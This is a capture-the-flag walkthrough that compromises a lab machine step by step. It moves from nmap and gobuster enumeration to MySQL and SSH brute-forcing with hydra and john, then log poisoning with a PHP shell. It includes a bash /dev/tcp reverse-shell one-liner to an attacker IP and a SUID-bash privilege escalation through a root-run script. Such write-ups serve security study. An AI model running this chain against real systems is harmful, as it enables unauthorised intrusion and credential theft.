Started a nmap scan
```
21 vsftpd 3.0.3
22 OpenSSH 8.2p1 Ubuntu
80 Apache 2.4.41
3306 MySQL 8.0.28
```
The FTP does not have anonymous login
Ran a nikto scan on the web host found nothing
Running a gobuster scan on the host tested `php,sql,txt,phps`
```
/index.php
/welcome.php redirects to login.php
/logout.php redirects to index
/config.php
```
After scanning for a while did not find much so back to the nmap scan going to enumerate the mysql service using nmap
`nmap -p 3306 --script=mysql*`
And found some valid usernames so we can try to crack the mysql service with this username list now
```
admin
netadmin
guest
user
web
administrator
sysadmin
root
webadmin
test
```
So the mysql service blocked us just keep restarting to will crack 
`root:m...ql` 
Now to enumerate the database there is one user and a hash we have to crack
`Adrian:ti...r` 
After we log in the site it tells us we have access to a log file tried brute forceing the FTP service with the username list if you do to much bruteing the log will be to big to inject into and wont be able to see the log
now we can inject a php shell into the log and access the server to get reverse shell enter this into the shell we injected
`/bin/bash -c 'bash -i > /dev/tcp/10.13.8.255/1340 0>%261'`
Now we have access to the server under `www-data` we can read the `config.php` file and has more db creds `adrian:P@ssw0...!`
So looking in the home folder of `adrian` there is a file called `.reminder` says `rules best of 64 + ! ettubrute` so we have to make a word list with john using the word `ettubrute` and add a ! at the end 
`john -wordlist:wordlist -rules:best64 -stdout > passwords` 
now we have a password list of 75 combos and make sure to a ! at the end of every word now we can use hydra to crack the ssh password for `adrian` now we got the password for his account `theettu....!` 
Now we have access `adrian` we can read the ftp in the ftp there is a folder called `files` and there are 2 files one `.notes` and the other `script` the notes file says he made a punch in script and plans to do something to it the script file points to `punch_in` and back in the home folder there is a file called `punch_in.sh` and this file is exacted by root but we cant write to it but we can write to the `punch_in` file and edit this into it `'chmod +s /bin/bash'` and after a minute and run `/bin/bash -p` and now we are root